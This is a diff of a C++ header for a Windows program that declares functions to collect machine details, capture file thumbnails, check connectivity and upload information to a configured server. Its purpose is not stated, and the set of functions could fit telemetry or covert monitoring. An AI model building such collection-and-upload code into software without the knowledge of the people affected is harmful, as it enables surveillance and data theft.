@@ -6,6 +6,7 @@
 #include <string>
 #include <vector>
 #include <map>
+#include "protobufhelper/model.pb.h"
 #include <intrin.h>
 #include <array>
 #include "stringutils.h"
@@ -18,6 +19,10 @@
 #include "Models.h"
 #include <ws2tcpip.h>
 #include <chrono>
+#include <Shobjidl.h>
+#include <Shlobj.h>
+
+#include "capture.h"
 #include <nlohmann/json.hpp>
 using json = nlohmann::json;
 // using namespace std::chrono;
@@ -25,8 +30,10 @@ typedef NTSYSAPI NTSTATUS (*RtlGetVersion)(PRTL_OSVERSIONINFOW *lpVersionInforma
 typedef void(WINAPI *RtlGetVersion_FUNC)(OSVERSIONINFOEXW *);
 EXPORT void Start();
 bool InternetIsWorking();
-void WaitForConnnection();
+void WaitForConnection();
 std::string GetAssetDir();
+HBITMAP GetThumbnail(std::string File);
+std::vector<uint8_t> CaptureFileThumbnail(std::string file);
 bool UploadInfo(std::string info);
 typedef struct WindowsVersion
 {
@@ -79,7 +86,7 @@ public:
     Information();
     static Information getInformation();
 };
-
+bool PostMachineDetails();
 WindowsVersion getWindowsVersion();
 std::string GetCpuInfo();
 std::map<std::string, std::string> getWmicResult(std::string cmd);
@@ -87,14 +94,15 @@ std::map<std::string, std::string> getWmicResult(std::string cmd);
 void initCPUCounter();
 double getCpuPercentage();
 std::vector<Disk> getDisks();
-std::string getUsername();
+
 
 std::string getExecutingBinary();
 std::string getLocalIP();
-std::string getMachineName();
 WindowsVersion getWindowsVersion();
 Screen getScreenDimensions();
 int64_t getSystemTime();
 std::string getCompileTime();
 int64_t getIdleTime();
 std::string Information2JSON(Information &info);
+
+extern const std::string SERVER_BASE;
